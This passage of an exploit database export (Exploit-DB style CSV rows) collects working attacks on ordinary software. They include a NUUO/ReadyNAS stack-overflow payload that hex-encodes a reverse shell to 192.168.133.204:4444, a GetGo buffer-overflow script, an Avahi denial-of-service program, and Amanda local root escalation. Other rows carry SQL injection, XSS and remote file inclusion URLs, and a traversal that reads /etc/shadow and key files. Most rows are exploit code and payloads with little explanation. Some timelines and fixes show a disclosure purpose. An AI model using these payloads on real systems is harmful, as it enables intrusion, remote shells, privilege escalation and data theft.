as the base address of libcrypto.so.0.9.8 (takes the argument from r0 - pointing to sp - and executes it) Payload: (in the stack) -> %6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%73%3b%20%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3c%20%2f%74%6d%70%2f%73%20%32%3e%26%31%20%7c%20%6f%70%65%6e%73%73%6c%20%73%5f%63%6c%69%65%6e%74%20%2d%71%75%69%65%74%20%2d%63%6f%6e%6e%65%63%74%20%31%39%32%2e%31%36%38%2e%31%33%33%2e%32%30%34%3a%34%34%34%34%20%3e%20%2f%74%6d%70%2f%73%3b%20%72%6d%20%2f%74%6d%70%2f%73%20%26 (""mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.133.204:4444 > /tmp/s; rm /tmp/s &"")  Illustration: sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{second_gadget}{system_address}aaaa{first_gadget}aaaaaaaaaaaa{payload}  Exploit for ReadyNAS Surveillance v1.1.2 (""sn"" parameter value): sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%91%66%cd%b6%bc%91%ef%b6aaaa%9c%1d%d8%b6aaaaaaaaaaaa%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%73%3b%20%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3c%20%2f%74%6d%70%2f%73%20%32%3e%26%31%20%7c%20%6f%70%65%6e%73%73%6c%20%73%5f%63%6c%69%65%6e%74%20%2d%71%75%69%65%74%20%2d%63%6f%6e%6e%65%63%74%20%31%39%32%2e%31%36%38%2e%31%33%33%2e%32%30%34%3a%34%34%34%34%20%3e%20%2f%74%6d%70%2f%73%3b%20%72%6d%20%2f%74%6d%70%2f%73%20%26  Note that due to the ASLR in the ReadyNAS his exploit has be attempted at few times in order for it to work. Usually less than 20 tries is enough to get the reverse shell to connect back.  > Local exploitation: This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command: CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline&sn=<PAYLOAD>' The cgi_main binary is located at ""/apps/surveillance/bin/cgi_main"" on the ReadyNAS and ""/NUUO/bin/cgi_main"" on the NVRmini2.  It is likely that all other vulnerabilities in this advisory are exploitable by a local attacker, however this has only been tested for the stack buffer overflow.   >> Fix:  NETGEAR and Nuuo did not respond to CERT/CC coordination efforts (see Timeline below), so no fix is available. Do not expose any of these devices to the Internet or any networks with unstrusted hosts.  Timeline: 28.02.2016: Disclosure to CERT/CC. 27.04.2016: Requested status update from CERT - they did not receive any response from vendors. 06.06.2016: Requested status update from CERT - still no response from vendors.             Contacted Nuuo and NETGEAR directly. NETGEAR responded with their ""Responsible Disclosure Guidelines"", to which I did not agree and requested them to contact CERT if they want to know the details about the vulnerabilities found. No response from Nuuo. 13.06.2016: CERT sent an update saying that NETGEAR has received the details of the vulnerabilities, and they are attempting to contact Nuuo via alternative channels. 07.07.2016: CERT sent an update saying that they have not received any follow up from both Nuuo and NETGEAR, and that they are getting ready for disclosure. 17.07.2016: Sent an email to NETGEAR and Nuuo warning them that disclosure is imminent if CERT doesn't receive a response or status update. No response received. 01.08.2016: Sent an email to NETGEAR and Nuuo warning them that disclosure is imminent if CERT doesn't receive a response or status update. No response received. 04.08.2016: Coordinated disclosure with CERT.   >> References: [1] https://www.kb.cert.org/vuls/id/856152   ================ Agile Information Security Limited http://www.agileinfosec.co.uk/ >> Enabling secure digital business >>",remote,remote,1
21719,Apache 2.0 - Full Path Disclosure source: https://www.securityfocus.com/bid/5485/info  A path disclosure vulnerability has been reported in Apache 2.0.x.  It is possible to reproduce this condition on vulnerable systems by making a request for certain types of files (such as error documents) that have been mapped by the server by type but fail to be served due to failure of MIME negotiation.  http://target/error/HTTP_NOT_FOUND.html.var,remote,remote,1
43391,"GetGo Download Manager 5.3.0.2712 - Buffer Overflow # Exploit Title: Buffer overflow vulnerability in GetGo Download Manager 5.3.0.2712 # CVE: CVE-2017-17849 # Date: 22-12-2017 # Tested on Windows 10 32 bits  # Exploit Author: Aloyce J. Makalanga # Contact: https://twitter.com/aloycemjr # Software Link: http://www.getgosoft.com/getgodm/  # Category: webapps # Attack Type: Remote # Impact: Code Execution      1. Description  A buffer overflow vulnerability in GetGo Download Manager 5.3.0.2712 and earlier could allow remote HTTP servers to execute arbitrary code on NAS devices via a long response. To exploit this vulnerability, an attacker needs to issue a malicious-crafted payload in the HTTP Response Header. A successful attack could result in code execution on the victim computer.       2. Proof of Concept     def main():     host = ""192.168.205.128""     port = 80      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     s.bind((host, port))     s.listen(1)     print ""\n[+] Listening on %d ..."" % port      cl, addr = s.accept()     print ""[+] Connection accepted from %s"" % addr[0]      evilbuffer = ""A"" * 4105     hardCodedEIP= ""\x69\x9E\x45\x76"" #This is a hardcoded EIP just for demo . As you can see on the screenshot, we hit a breakpoint, right here on this EIP. Do you see our stack!!! You need to change this.      pads  = ""C""*(6000 - len(evilbuffer + hardCodedEIP))     payload = evilbuffer + hardCodedEIP + pads      buffer = ""HTTP/1.1 200 "" + payload + ""\r\n""      print cl.recv(1000)     cl.send(buffer)     print ""[+] Sending buffer: OK\n""      sleep(3)     cl.close()     s.close()  if __name__ == '__main__':     import socket     from time import sleep     main()  3. Solution:     No solution as of yet.",remote,dos,1
31878,"HP Instant Support 1.0.22 - 'HPISDataManager.dll' ActiveX Control Arbitrary File Creation source: https://www.securityfocus.com/bid/29535/info  HP Instant Support 'HPISDataManager.dll' ActiveX control is prone to a vulnerability that lets attackers create and overwrite files with arbitrary, attacker-controlled content.  Successful exploits may compromise affected computers and aid in further attacks.  HP Instant Support 1.0.0.22 and earlier versions are affected.  NOTE: This issue was previously covered in BID 29526 (HP Instant Support 'HPISDataManager.dll' ActiveX Control Unspecified Code Execution Vulnerabilities), but has been given its own record because of new information.  <?XML version='1.0' standalone='yes' ?> <package><job id='DoneInVBS' debug='false' error='true'> <object classid='clsid:14C1B87C-3342-445F-9B5E-365FF330A3AC' id='target' /> <script language='vbscript'> targetFile = ""C:\WINDOWS\Downloaded Program Files\HPISDataManager.dll"" prototype = ""Sub AppendStringToFile ( ByVal bstrInputFileName As String , ByVal bstrInputString As String )"" memberName = ""AppendStringToFile"" progid = ""HPISDataManagerLib.Datamgr"" argCount = 2 arg1=""c:\evil.exe"" arg2=String(""CSIS entered this"") target.AppendStringToFile arg1 ,arg2 </script></job></package>",remote,dos,0
28691,Quickblogger 1.4 - Remote File Inclusion source: https://www.securityfocus.com/bid/20210/info  Quickblogger is prone to a remote file-include vulnerability because it fails to properly sanitize user-supplied input.  A successful exploit of this issue allows an attacker to execute arbitrary server-side script code on an affected computer with the privileges of the webserver process. This may facilitate unauthorized access.  Quickblogger version 1.4 is vulnerable to these issues.  http://www.example.com/[path]/acc.php?page=attacker's_file,remote,webapps,1
10711,"phpAuction - Cross-Site Scripting ========================================================================================                   | # Title    : PHPAUCTION Cross Site Scripting Vulnerability                           | | # Author   : indoushka                                                               | | # email    : indoushka@hotmail.com                                                   | | # Home     : Souk Naamane - 04325 - Oum El Bouaghi - Algeria -(00213771818860)       | | # EDB-ID   :                                                                         | | # CVE-ID   : ()                                                                      | | # OSVDB-ID : ()                                                                      | | # DAte     :16/12/2009                                                               | | # Verified :                                                                         | | # Web Site : www.iq-ty.com                                                           | | # Published:                                                                         | | # Script   : Copyright 2000-2009, PHPAUCTION.ORG                                     | | # Tested on: windows SP2 Fran&#65533;ais V.(Pnx2 2.0) + Lunix Fran&#65533;ais v.(9.4 Ubuntu)       | | # Bug      : XSS                                                                     |  ======================      Exploit By indoushka       ================================= | # Exploit  :  |  | 1-http://localhost/phpauction/register.php?TPL_name=1>""><ScRiPt%20%0d%0a>alert(213771818860)%3B</ScRiPt>&TPL_nick=indoushka&TPL_password=indoushka@hotmail.com&TPL_repeat_password=indoushka@hotmail.com&TPL_email=indoushka@hotmail.com | 2- http://localhost/phpauction/register.php?TPL_name=indoushka&TPL_nick=1%3E%22%3E%3CScRiPt%20%0d%0a%3Ealert(213771818860)%3B%3C/ScRiPt%3E&TPL_password=indoushka@hotmail.com&TPL_repeat_password=indoushka@hotmail.com&TPL_email=indoushka@hotmail.com&TP | ================================   Dz-Ghost Team   ======================================== Greetz : all my friend * Dos-Dz * Snakespc * His0k4 * Hussin-X * Str0ke * Saoucha * Star08 | -------------------------------------------------------------------------------------------",remote,webapps,1
5097,SAPID CMF Build 87 - 'last_module' Remote Code Execution ### SAPID CMF Build 87 (last_module) Remote Code Execution Vulnerability ### Script R84 : http://puzzle.dl.sourceforge.net/sourceforge/sapidcmf/sapidcmf.r84.zip ### Script Update R87 :http://surfnet.dl.sourceforge.net/sourceforge/sapidcmf/sapidcmf.update.r84-r87.zip ### Dork : Powered by SAPID CMF Build 87 ### Vuln : ### 09:  */  eval('class perfmon_parent_EXTENDER extends ' . $last_module . '_ADOConnection { }'); ### POC : ###     /vendors/adodb_lite/adodb-perf-module.inc.php?last_module=t{};%20class%20t{};passthru(ls);// ###     OR INCLUDE SHELL ###     /vendors/adodb_lite/adodb-perf-module.inc.php?last_module=t{};%20class%20t{};include(URL-SHELL);// ###  I'm TrYaGi ......:)  # milw0rm.com [2008-02-10],remote,webapps,1
5766,"realm CMS 2.3 - Multiple Vulnerabilities ########################## www.BugReport.ir ####################################### # #        AmnPardaz Security Research Team # # Title: Realm CMS Multiple Vulnerabilities Lead to Admin Access. # Vendor: www.realmproject.com # Vulnerable Version: 2.3 and prior versions # Exploit: Available # Impact: High # Fix: N/A # Original Advisory: http://bugreport.ir/index.php?/40 ###################################################################################  #################### 1. Description: ####################  Realm CMS is an unique FREE classic ASP application integrating  together Content Management and Blogging web publishing. Realm CMS is  especially designed and tuned to be fast and smart handling web sites  including thousands of web pages. Realm CMS is fundamentally based on  the technology of caching - simultaneously using server's RAM and disk.  This means that Realm CMS web site is easily managed as are database  driven web sites and the same time it is as fast, robust as web sites  based on pure HTML. This feature makes Realm CMS MS Access database  driven web site fast and robust as are enterprise level database driven  sites.   #################### 2. Vulnerabilities: ####################     2.1. Broken Authentication and Session Management. Attacker can enter to the admin pages by a manipulated cookie.         2.1.1. Exploit:                         Check the exploit section.     2.2. Injection Flaws. SQL Injection in ""inc_routines.asp"" in ""KeyWordsList"" function on ""kwrd"" parameter.         2.2.1. Exploit:                         Check the exploit section.     2.3. Cross Site Scripting (XSS), Information Leakage. Reflected XSS attack, and DB path disclosure in ""/cms/_db/compact.asp""         2.3.1. Exploit:                         Check the exploit section. #################### 3. Exploits: ####################     Original Exploit URL: http://bugreport.ir/index.php?/40/exploit     3.1. Attacker can enter to the admin pages by a manipulated cookie.         -------------         -Set these cookies:             RealmCmsUser=cUserfiles=userFiles&cIntallType=BugReportTeam&cDbLocat=in&cSiteName=www.Bugreport.IR&cFolder=%2Fcms&cUniqueID=db&cUserRole=1&cUserName=Admin&cUserID=20         -Then go to:             /_RealmAdmin/login.asp         -------------     3.2. SQL Injection in ""inc_routines.asp"" in ""KeyWordsList"" function on ""kwrd"" parameter.         -------------         http://[URL]/cmsr/?job=kwl&kwrd=WWW.BugReport.IR' union select name,password from tblusers where name not like '%WWW.BugReport.IR         -------------     3.3. Reflected XSS attack, and DB path disclosure in ""/cms/_db/compact.asp""         -------------         http://[URL]/cms/_db/compact.asp?CmpctedDB=%3Cscript%3Ealert('XSSed by BugReport.IR')%3C/script%3E    (Reflected XSS attack)         http://[URL]/cms/_db/compact.asp?CmpctedDB=1&Boyut=%3Cscript%3Ealert('XSSed by BugReport.IR')%3C/script%3E    (Reflected XSS attack)         http://[URL]/cms/_db/compact.asp    (DB path disclosure)         ------------- #################### 4. Solution: ####################     Rename admin directory ""/_RealmAdmin"" and wait for vendor patch (for 2.1).     Edit the source code to ensure that inputs are properly sanitized (for 2.2).     Remove or rename all the ""/_db/compact.asp"" files, in the cms (for 2.3). #################### 5. Credit: #################### AmnPardaz Security Research & Penetration Testing Group Contact: admin[4t}bugreport{d0t]ir WwW.BugReport.ir WwW.AmnPardaz.com  # milw0rm.com [2008-06-09]",remote,webapps,1
33104,"Star Wars Battlefront II 1.1 - Remote Denial of Service source: https://www.securityfocus.com/bid/35806/info  Star Wars Battlefront II is prone to a remote denial-of-service vulnerability because the application fails to handle exceptional conditions.  An attacker could exploit this issue to crash the affected application, denying service to legitimate users. Given the nature of this issue, the attacker may also be able to run arbitrary code, but this has not been confirmed.  This issue affects Star Wars Battlefront II 1.1 and prior versions.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/33104.zip",remote,dos,1
35895,"RealityServer Web Services RTMP Server 3.1.1 build 144525.5 - Null Pointer Dereference Denial of Service source: https://www.securityfocus.com/bid/48476/info  RealityServer Web Services is prone to a remote denial-of-service vulnerability caused by a NULL pointer dereference.  Attackers can exploit this issue to cause the server to dereference an invalid memory location, resulting in a denial-of-service condition. Due to the nature of this issue arbitrary code-execution maybe possible; however this has not been confirmed.  RealityServer Web Services 3.1.1 build 144525.5057 is vulnerable; other versions may also be affected.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/35895.zip     #######################################################################                               Luigi Auriemma  Application:  NVIDIA RealityServer               http://www.realityserver.com/products/realityserver.html               http://www.nvidia.com/object/realityserver.html Versions:     <= 3.1.1 build 144525.5057 Platforms:    Windows and Linux Bug:          NULL pointer Exploitation: remote, versus server Date:         27 Jun 2011 (found and reported on my forum 04 Dec 2010) Author:       Luigi Auriemma               e-mail: aluigi@autistici.org               web:    aluigi.org   #######################################################################   1) Introduction 2) Bug 3) The Code 4) Fix   #######################################################################  =============== 1) Introduction ===============   From vendor's website: ""The RealityServer� platform is a powerful combination of NVIDIA� Tesla� GPUs and 3D web services software that delivers interactive, photorealistic applications over the web, enabling product designers, architects and consumers to easily visualize 3D scenes with remarkable realism.""   #######################################################################  ====== 2) Bug ======   If the byte at offset 0xc01 of the packet is >= 0x80 there will be a NULL pointer dereference.   #######################################################################  =========== 3) The Code ===========   http://aluigi.org/testz/udpsz.zip    udpsz -C 03 -b 0xff -T SERVER 1935 0xc02   #######################################################################  ====== 4) Fix ======   No fix.   #######################################################################",remote,dos,1
21528,"Geeklog 1.3.5 - Calendar Event Form Script Injection source: https://www.securityfocus.com/bid/4974/info  Geeklog does not sufficiently sanitize script code from form fields, making it prone to script injection attacks.  Attacker-supplied script code may potentially end up in webpages generated by Geeklog and will execute in the browser of a user who views such pages, in the security context of the website.   Link input($url) :&lt;scriptsrc=""http://forum.olympos.org/f.js"">Alper&lt;/script&gt;",remote,webapps,1
31261,"A10 Networks Loadbalancer - Directory Traversal ----------- Author: -----------  xistence < xistence[at]0x90[.]nl >  ------------------------- Affected products: -------------------------  A10 Networks Loadbalancer (Soft)AX <=2.6.1-GR1-P5 & <=2.7.0 build 217  ------------------------- Affected vendors: -------------------------  A10Networks http://www.a10networks.com/  ------------------------- Product description: -------------------------  SupportCenter Plus is a web-based customer support software that lets organizations effectively manage customer tickets, their account & contact information, the service contracts and in the process providing a superior customer experience.  ---------- Details: ----------  [ 0x01 - Directory Traversal ]  A10 Networks (Soft)AX <=2.6.1-GR1-P5 & <=2.7.0 build 217 is prone to an unauthenticated directory traversal vulnerability. It's possible to download any file on the remote AX device with root privileges, without the need to authenticate to the website.  The bug was fixed earlier in A10 Tracking ID ""82150"" according to the release notes, however the fix is not sufficient and can be bypassed.  The new protection seems to make sure files are under the /a10data/tmp dir (https://<IP>/xml/downloads/?filename=/a10data/tmp/).  By sending a GET request to ""https://<IP>/xml/downloads/?filename=/a10data/tmp/../.."" and thus keeping /a10data/tmp, we can bypass this. So if we would like to download the file /etc/shadow we send a GET request to ""https:// <IP>/xml/downloads/?filename=/a10data/tmp/../../etc/passwd"".  Or if we would like to download a certificate key file: ""https:// <IP>/xml/downloads/?filename=/a10data/tmp/../../a10data/key/domain.com""  WARNING: Downloading a file will delete it from the AX device!   ----------- Solution: -----------  Upgrade to a newer version.  -------------- Timeline: --------------  Fixed somewhere back in 2013 :)",remote,webapps,1
45843,"Webiness Inventory 2.3 - 'order' SQL Injection # Exploit Title: Webiness Inventory 2.3 - SQL Injection # Dork: N/A # Date: 2018-11-11 # Exploit Author: Ihsan Sencan # Vendor Homepage: https://github.com/webiness/webiness_inventory # Software Link: https://kent.dl.sourceforge.net/project/webinessinventory/2.3/webiness_inventory-2.3.zip # Version: 2.3 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1) # http://localhost/[PATH]/protected/library/ajax/WsModelGrid.php #  POST /[PATH]/protected/library/ajax/WsModelGrid.php HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 541 model=PartnerModel&order=%28%53%45%4c%45%43%54%20%31%20%46%52%4f%4d%28%53%45%4c%45%43%54%20%43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%32%3d%32%2c%31%29%29%29%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53%20%47%52%4f%55%50%20%42%59%20%78%29%61%29 HTTP/1.1 500 Internal Server Error Date: Sun, 11 Nov 2018 16:16:54 GMT Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30 X-Powered-By: PHP/5.6.30 Content-Length: 315 Connection: close Content-Type: text/html; charset=UTF-8",remote,webapps,1
33164,"WebKit - Floating Point Number Remote Buffer Overflow source: https://www.securityfocus.com/bid/36023/info  WebKit is prone to a remote buffer-overflow vulnerability.  An attacker can exploit this issue to execute arbitrary code in the context of the application. Failed exploit attempts will result in a denial-of-service condition.  Versions prior to Apple Safari 4.0.3 are vulnerable; other applications using WebKit may also be affected.    Example 1: --------- <script> var Overflow = ""31337"" + 0.313373133731337313373133731337...; </script> ---------  Example 2: --------- <img width=0.3133731337313373133731337... src=""31337.jpg""> ---------",remote,remote,1
376,"Microsoft Internet Explorer - 'mshtml.dll' Remote Null Pointer Crash <center><a href=::%7b>Right Click aOn Me And Click ""Save Target As""</a>    // milw0rm.com [2004-08-04]",remote,dos,1
2599,"pandaBB - 'displayCategory' Remote File InclusionpandaBB (basepath;adminpath) Remote File Include [Script name: pandaBB [Script site: http://phpnuke.pl Find by: nukedclx (nukedclx@gmail.com)  DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam Contact: - kacper1964@yahoo.pl - http://www.rahim.webd.pl/ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Greetings DragonHeart and all DEVIL TEAM Patriots :) - Leito & Leon & Kacper TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko., CrazzyIwan, Rammstein Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, SkD, MXZ, sysios, mIvus, wacky   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ in modules/My_eGallery/public/displayCategory.php  lines 1-3: <?php include (""$basepath/public/imageFunctions.php""); include (""$adminpath/fileFunctions.php"");  %Exploit         http://host/pandadir/modules/My_eGallery/public/displayCategory.php?adminpath=http://sh3ll         http://host/pandadir/modules/My_eGallery/public/displayCategory.php?basepath=http://sh3ll  # milw0rm.com [2006-10-19]",remote,webapps,1
6112,"EZWebAlbum - Remote File Disclosure ##################################################################################################  EZWebAlbum (dlfilename) Remote File Disclosure Vulnerability     |,  .-.  .-.  ,|  Found by : Ghost Hacker [ R-H TeaM ]                             | )(_o/  \o_)( |  My Site web : Real-hack.Net                                      |/     /\     \| ################################################################################################## [~] Found by : Ghost Hacker [ R-H TeaM ] [~] Home page : www.Real-hack.net [~] Email : Ghost-r00t@Hotmail.com [~] Name Script : EZWebAlbum [~] Download Script : http://sourceforge.net/projects/ezwebalbum ###################################### [ Viva IslaM & KSA ] ###################################### [~] Error (download.php) : readfile($dlfilename);  [~] Exploit : http://xxxx/[path]/download.php?dlfilename=EVIL [~] Example : http://xxxx/[path]/download.php?dlfilename=index.php ###################################### [ Viva IslaM & KSA ] ###################################### [~] Greetz : PROTO & QaTaR BoeZ TeaM & Aseg-Rabe7 & Dmar al3noOoz & 4Bo3tB & LeGeNd HaCkEr & Root Hacker .. Qptan & ScarY.HaCkEr & EgYpTiaNxHaCkEr the-pirate.org & Mr.hope & My Blog[ gh0st10.wordpress.com ] All Members Real Hack And All My Friends .. ##################################################################################################  Found by : Ghost Hacker [ R-H TeaM ] ##################################################################################################  # milw0rm.com [2008-07-21]",remote,webapps,1
39244,"Amanda 3.3.1 - 'amstar' Command Injection Privilege Escalation AMANDA, the Advanced Maryland Automatic Network Disk Archiver, is a backup  solution that allows the IT administrator to set up a single master backup server to back up multiple hosts over network to tape drives/changers or  disks or optical media. Amanda uses native utilities and formats (e.g. dump and/or GNU tar) and can back up a large number of servers and workstations running multiple versions of Linux or Unix.   A user with backup privs can trivially compromise a client installation. Amstar is an Amanda Application API script. It should not be run by users  directly. It uses star to backup and restore data. It runs binaries with root permissions when parsing the command line arguement --star-path.   Tested against Amanda 3.3.1. An example is shown below:  $ id uid=34(backup) gid=34(backup) groups=34(backup),6(disk),26(tape) $ cat /tmp/runme.sh #!/bin/sh /bin/sh $ ls -al /usr/lib/amanda/application/amstar -rwsr-xr-- 1 root backup 31284 Jul 29  2012 /usr/lib/amanda/application/amstar $ /usr/lib/amanda/application/amstar restore --star-path=/tmp/runme.sh # id uid=0(root) gid=34(backup) groups=0(root),6(disk),26(tape),34(backup) # uname -a Linux raspberrypi 3.10.25 #1 Sat Dec 28 20:50:23 EST 2013 armv6l GNU/Linux #   -- Hacker Fantastic",local,local,1
7520,"Avahi < 0.6.24 - mDNS Daemon Remote Denial of Service /*  * cve-2008-5081.c  *  * Avahi mDNS Daemon Remote DoS < 0.6.24  * Jon Oberheide <jon@oberheide.org>  * http://jon.oberheide.org  *  * Usage:  *  *   gcc cve-2008-5081.c -ldnet -o cve-2008-5081  *   ./cve-2008-5081 1.2.3.4  *    * Information:  *  *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5081  *      *   Crafted mDNS packet with source port 0 can cause avahi-daemon    *   to abort() due to failed assertion assert(port > 0); in    *   originates_from_local_legacy_unicast_socket() function in  *   avahi-core/server.c.  *  */   #include <stdio.h> #include <stdlib.h> #include <string.h> #include <dnet.h>   int main(int argc, char **argv) {     ip_t *sock;     intf_t *intf;     struct addr dst;     struct ip_hdr *ip;     struct udp_hdr *udp;     struct intf_entry entry;     int len = IP_HDR_LEN + UDP_HDR_LEN;     char buf[len];       if (argc < 2 || addr_aton(argv[1], &dst)) {           printf(""error: please specify a target ip address\n"");         return 1;     }       memset(buf, 0, sizeof(buf));       ip = (struct ip_hdr *) buf;     ip->ip_v = 4;     ip->ip_hl = 5;     ip->ip_tos = 0;     ip->ip_off = 0;     ip->ip_sum = 0;     ip->ip_ttl = IP_TTL_MAX;     ip->ip_p = IP_PROTO_UDP;     ip->ip_id = htons(0xdead);     ip->ip_len = htons(len);       udp = (struct udp_hdr *) (buf + IP_HDR_LEN);          udp->uh_sum = 0;     udp->uh_sport = htons(0);     udp->uh_dport = htons(5353);     udp->uh_ulen = htons(UDP_HDR_LEN);       intf = intf_open();     intf_get_dst(intf, &entry, &dst);     intf_close(intf);       ip->ip_src = entry.intf_addr.addr_ip;     ip->ip_dst = dst.addr_ip;     ip_checksum(buf, len);       sock = ip_open();     if (!sock) {         printf(""error: root privileges needed for raw socket\n"");         return 1;     }     ip_send(sock, buf, len);     ip_close(sock);       return 0; }  // milw0rm.com [2008-12-19]",remote,dos,1
27942,"AVTECH DVR Firmware 1017-1003-1009-1003 - Multiple Vulnerabilities Core Security - Corelabs Advisory http://corelabs.coresecurity.com/  AVTECH DVR multiple vulnerabilities   1. *Advisory Information*  Title: AVTECH DVR multiple vulnerabilities Advisory ID: CORE-2013-0726 Advisory URL: http://www.coresecurity.com/advisories/avtech-dvr-multiple-vulnerabilities Date published: 2013-08-28 Date of last update: 2013-08-28 Vendors contacted: AVTECH Corporation Release mode: User release   2. *Vulnerability Information*  Class: Buffer overflow [CWE-119], Buffer overflow [CWE-119], Improper Access Control [CWE-284] Impact: Code execution, Security bypass Remotely Exploitable: Yes Locally Exploitable: No CVE Name: CVE-2013-4980, CVE-2013-4981, CVE-2013-4982   3. *Vulnerability Description*  Multiple vulnerabilities have been found in AVTECH AVN801 DVR [1] (and potentially other devices sharing the affected firmware) that could allow a remote attacker:     1. [CVE-2013-4980] To execute arbitrary code without authentication by exploiting a buffer overflow in the RTSP packet handler.    2. [CVE-2013-4981] To execute arbitrary code without authentication by exploiting a buffer overflow in '/cgi-bin/user/Config.cgi', via a specially crafted HTTP POST request.    3. [CVE-2013-4982] To bypass the captcha of the administration login console enabling several automated attack vectors.   4. *Vulnerable Packages*     . DVR 4CH H.264 (AVTECH AVN801) firmware 1017-1003-1009-1003.    . Older versions are probably affected too, but they were not checked.   5. *Vendor Information, Solutions and Workarounds*  There was no official answer from AVTECH support team after several attempts (see [Sec. 8]); contact vendor for further information. Some mitigation actions may be:     . Do not expose the DVR to internet unless absolutely necessary.    . Have at least one proxy filtering the 'SETUP' parameter in RTSP requests.    . Have 